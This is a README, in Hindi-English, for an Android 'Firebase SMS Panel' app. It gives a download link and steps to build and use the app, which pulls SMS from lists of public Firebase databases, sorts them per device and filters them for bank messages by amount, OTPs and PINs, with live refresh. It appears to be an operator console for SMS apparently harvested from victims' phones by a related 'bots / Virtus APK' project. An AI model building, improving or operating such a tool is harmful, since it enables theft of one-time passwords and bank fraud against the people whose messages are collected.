# Firebase SMS Panel (standalone APK)

Alag Android app — repo ke bots / Virtus APK se **alag**. TXT me Firebase RTDB URLs → HTTPS parallel fetch → device list. Har SMS par **sender ID** clearly.

## APK (GitHub — tap download)

After push to branch `cursor/firebase-sms-panel-apk-8042`, direct file:

`https://github.com/hivirtusss/V2-testing-done/raw/cursor/firebase-sms-panel-apk-8042/releases/FirebaseSmsPanel-1.0-release-unsigned.apk`

**Unsigned** — phone pe “Install unknown apps” allow karo. Production ke liye apni key se sign karo.

## Build

1. Android Studio (latest) → **Open** → `firebase-sms-panel-app`
2. Gradle sync → Run / Build APK  
   (Pehli sync pe Gradle wrapper scripts ban sakte hain.)

## Use

1. **TXT — Firebase URLs** → `.txt` pick (URLs newline / mixed text dono).
2. **Inbox mode (chips)**  
   - **All bank** — saari bank-like SMS (amount band **nahi** — High/Low sort by amount).  
   - **Bank + band** — amount sirf **High→Low 50K–90L** ya **Low→High 2K–50K** ke andar.  
   - **OTP / Jio** — OTP / telco / Jio style alerts (sender ID dikhega).  
   - **Full inbox** — short-link spam hata ke **jo Firebase pe sync ho** (purani + nayi).  
3. **PIN filter** — sirf **Bank** modes par (device par koi PIN-pattern SMS ho to “PIN device”).
4. **Connection** — Online / Offline / Both.  
5. **SMS age** — `1d` … `30d` ya **All (old+new)** — timestamp na ho to bhi message dikhega (purane logs).
6. **Live refresh** — switch ON = har **45s** par URLs dubara fetch (background job).
7. Top **refresh** icon — turant dubara pull.
8. Device row tap → bottom sheet: **Firebase URL, device id, sender, body**.

## Data

- Har fetch me zyada SMS lane ke liye deep JSON walk + timeout badhaya; cap ~**8000** SMS/DB (OOM se bachne ke liye).
- **Live** = app ko dubara sync karna; SMS tab dikhenge jab phone/WMS Firebase ko update kare.

## Notes

- Firebase RTDB **public read** hona chahiye warna kuch nahi aayega.
- OTP mode spam short-links hata hai; baaki telco sender IDs match karne ki koshish.
